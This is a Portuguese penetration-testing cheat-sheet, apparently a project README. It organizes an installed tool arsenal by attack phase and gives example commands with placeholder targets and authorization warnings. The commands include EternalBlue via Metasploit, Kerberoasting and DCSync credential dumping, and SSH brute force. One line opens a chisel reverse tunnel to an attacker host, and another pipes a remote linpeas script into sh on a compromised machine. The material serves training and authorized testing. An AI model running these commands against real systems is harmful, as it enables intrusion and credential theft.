# 🗡️ Arsenal de Pentest — Metodologia por Fase

> Cheat-sheet do arsenal instalado por `tools/setup-arsenal.sh`, organizado pela
> metodologia clássica de um teste de intrusão. Cada fase: **objetivo**,
> **ferramentas** e **exemplos de comando**.

> ⚠️ **Uso autorizado apenas.** Instalar é legal; usar contra sistemas que você
> não possui ou não tem autorização escrita para testar é **crime**. Pratique em
> **labs** (veja o final) ou no **seu** VPS. Em todos os exemplos, `TARGET` é um
> alvo seu/autorizado.

---

## Instalação

```bash
./tools/setup-arsenal.sh            # tudo (pede confirmação)
./tools/setup-arsenal.sh --list     # mostra o que cada fase instala
./tools/setup-arsenal.sh web -y     # só uma fase, sem prompt
./tools/setup-arsenal.sh recon web password   # várias fases
```
> É **opt-in** — propositalmente separado do hook de sessão (que instala só o
> núcleo). O arsenal completo é pesado (~GBs com SecLists/hashcat).

---

## 🔭 Fase 1 — Recon / OSINT
**Objetivo:** mapear a superfície sem tocar (ou tocando de leve) o alvo: domínios, subdomínios, e-mails, tecnologias.

| Ferramenta | Para quê |
|---|---|
| `whois` | dono do domínio / faixa de IP |
| `dig` / `dnsrecon` / `dnsenum` / `fierce` | registros e enumeração DNS |
| `subfinder` | descoberta de subdomínios (passiva) |
| `theHarvester` | e-mails, hosts e subdomínios de fontes públicas |
| `wafw00f` | detecta se há WAF na frente |

```bash
whois exemplo.com
dig +short exemplo.com any
dnsrecon -d exemplo.com
subfinder -d exemplo.com -silent
theHarvester -d exemplo.com -b bing,duckduckgo
wafw00f https://exemplo.com
```
> 💡 amass v5 não tem mais binário pronto; se quiser, instale via `snap install amass` ou `go install`.

## 🛰️ Fase 2 — Scanning / Enumeration
**Objetivo:** hosts vivos, portas, serviços, versões e enumeração de SMB/SNMP/NetBIOS.

| Ferramenta | Para quê |
|---|---|
| `nmap` | o canivete: portas, versões, OS, scripts NSE |
| `masscan` | varredura de portas ultrarrápida (cuidado com a taxa!) |
| `fping` / `netdiscover` / `arp-scan` | descoberta de hosts (sweep/ARP) |
| `nbtscan` / `enum4linux` / `smbmap` | enumeração NetBIOS/SMB |
| `onesixtyone` / `snmpwalk` | enumeração SNMP |

```bash
nmap -sV -sC -O -p- TARGET           # completo (serviço+scripts+OS)
nmap --script vuln TARGET            # checagem de vulns conhecidas
masscan -p1-65535 TARGET --rate 1000 # rápido (ajuste a taxa!)
enum4linux -a TARGET                 # SMB/AD enum
smbmap -H TARGET                     # shares SMB
snmpwalk -v2c -c public TARGET       # SNMP community 'public'
```

## 🌐 Fase 3 — Web
**Objetivo:** falhas de aplicação e configuração. (Veja também `tools/web-recon.sh` para um fluxo seguro pronto.)

| Ferramenta | Para quê |
|---|---|
| `nikto` | configs inseguras / arquivos expostos |
| `whatweb` | fingerprint de tecnologias |
| `gobuster` / `ffuf` / `dirb` / `feroxbuster` | brute de diretórios/arquivos |
| `wfuzz` | fuzzing de parâmetros |
| `sqlmap` | SQL Injection (detecção e exploração) |
| `wpscan` | auditoria de WordPress |
| `commix` | command injection |
| `joomscan` | auditoria de Joomla |
| `nuclei` | templates de CVEs/exposições |

```bash
gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://TARGET/FUZZ -w wordlist.txt
nuclei -u https://TARGET -exclude-tags dos,intrusive
sqlmap -u "https://TARGET/page?id=1" --batch          # só em alvo seu!
wpscan --url https://TARGET --enumerate u
```

## 💥 Fase 4 — Exploitation
**Objetivo:** transformar vulnerabilidade em acesso.

| Ferramenta | Para quê |
|---|---|
| `metasploit` (`msfconsole`) | framework de exploração + payloads |
| `searchsploit` | busca exploits no Exploit-DB offline |

```bash
searchsploit apache 2.4            # acha exploits por produto/versão
searchsploit -m 50383             # copia o exploit pro diretório atual
msfconsole -q                     # abre o framework
  search ms17-010
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS TARGET; set LHOST SEU_IP; run
```

## 🏰 Fase 4.5 — Active Directory
**Objetivo:** comprometer redes Windows/AD — enumeração, Kerberos, credenciais, movimento lateral. **Guia dedicado:** [AD.md](AD.md).

| Ferramenta | Para quê |
|---|---|
| `impacket` | secretsdump, GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP), psexec, ntlmrelayx |
| `netexec` (nxc) | enum/spray/exec em massa (SMB/WinRM/LDAP) |
| `kerbrute` | enum de usuários + spray via Kerberos |
| `bloodhound-python` | mapa de caminhos de ataque até Domain Admin |
| `certipy` | abuso de AD CS (ESC1–ESC8) |
| `Responder` | LLMNR/NBT-NS poisoning → hashes NetNTLM |
| `ldapdomaindump` / `evil-winrm` | dump LDAP / shell WinRM |

```bash
./tools/setup-arsenal.sh ad -y
kerbrute userenum -d dominio.local --dc DC_IP users.txt
GetUserSPNs.py dominio.local/user:pass -dc-ip DC_IP -request   # Kerberoast
bloodhound-python -d dominio.local -u user -p pass -c All -ns DC_IP
secretsdump.py dominio.local/admin:pass@DC_IP                  # DCSync
```

## 🔑 Fase 5 — Passwords / Cracking
**Objetivo:** credenciais — online (contra serviço) e offline (contra hashes).

| Ferramenta | Para quê |
|---|---|
| `hydra` / `medusa` / `ncrack` | brute force online (ssh, ftp, http...) |
| `john` / `hashcat` | cracking offline de hashes |
| `netexec` (nxc) | spray/execução em SMB/WinRM/AD |
| `cewl` | gera wordlist a partir do site alvo |

```bash
hydra -L users.txt -P rockyou.txt ssh://TARGET
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt rockyou.txt        # -m 0 = MD5
netexec smb TARGET -u user -p pass
```
> ⚠️ Brute force pode **travar contas** e derrubar serviço — só em lab/autorizado, nunca em login de produção.

## 🪜 Fase 6 — Post-exploitation / Pivoting
**Objetivo:** depois do shell — escalar privilégio, pivotar, manter acesso.

| Ferramenta | Para quê |
|---|---|
| `proxychains4` / `socat` | encadear proxies / redirecionar portas |
| `chisel` | túnel TCP/UDP sobre HTTP (pivoting) |
| **scripts no alvo** | `linPEAS`/`winPEAS` (enum de privesc), `pspy`, `LinEnum`, `PowerSploit` |

```bash
# no SEU host: servidor de túnel reverso
chisel server -p 8080 --reverse
# no alvo comprometido: cliente
chisel client SEU_IP:8080 R:1080:socks
proxychains4 nmap -sT 10.10.10.0/24   # escaneia a rede interna via túnel
# privesc enum (rode linpeas no alvo):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## 📡 Fase 7 — Wireless
**Objetivo:** auditar Wi-Fi (precisa de adaptador em modo monitor — **não funciona em VPS/sandbox**).

| Ferramenta | Para quê |
|---|---|
| `aircrack-ng` | captura/quebra de handshakes WPA |
| `wifite` | automação do ataque Wi-Fi |
| `reaver` | ataque a WPS |

```bash
airmon-ng start wlan0
wifite                 # interativo, captura handshakes da SUA rede
aircrack-ng -w rockyou.txt captura.cap
```

## 🕵️ Fase extra — OSINT
**Objetivo:** inteligência passiva (pessoas, contas, segredos). Guia: [OSINT.md](OSINT.md).
`theHarvester` · `subfinder`/`sublist3r` · `holehe` (e-mail) · `maigret`/`sherlock` (username) · `trufflehog` (segredos em git).

## ☁️ Fase extra — Cloud
**Objetivo:** auditar/atacar AWS/Azure/GCP. Guia: [CLOUD.md](CLOUD.md).
`scoutsuite` · `prowler` · `pacu` · `cloud_enum` · `awscli`.

## 📱 Fase extra — Mobile
**Objetivo:** análise de APK Android. Guia: [MOBILE.md](MOBILE.md).
`apktool` · `jadx` · `frida`/`objection` · MobSF (Docker).

## 📊 Relatório unificado
`tools/engage.sh <alvo>` roda o recon não-destrutivo e gera **um HTML consolidado**
(DNS, portas, tecnologias, TLS, config, CVEs) — ótimo para entregar ao cliente/registrar.

## 📚 Fase 8 — Wordlists
- **SecLists** (`/opt/arsenal/SecLists`) — a coleção de referência (dirs, users, senhas, payloads).
- **rockyou** (`/usr/share/wordlists/rockyou.txt`) — clássica de senhas.

---

## 🧪 Onde praticar (labs legais e gratuitos)

| Lab | O que treina |
|---|---|
| **Metasploitable 2/3** | exploração de rede/serviços (combina com o hackerEnv) |
| **OWASP Juice Shop** | vulnerabilidades web modernas |
| **DVWA** | web clássico (SQLi, XSS, upload) em níveis |
| **VulnHub** | VMs vulneráveis variadas (boot2root) |
| **HackTheBox / TryHackMe** | plataformas online guiadas |
| **PortSwigger Web Security Academy** | labs web grátis com teoria |

> Suba os labs em **rede isolada** (host-only). Nunca exponha uma VM vulnerável à internet.

---

## 🛡️ Fecha o ciclo (blue team)
Para cada coisa que você explorar, pergunte: *como eu detectaria e corrigiria isso?*
É o que transforma o exercício ofensivo em **defesa real** — e é onde mora o
aprendizado que vale. Use a seção **Remediação** dos relatórios como ponto de partida.
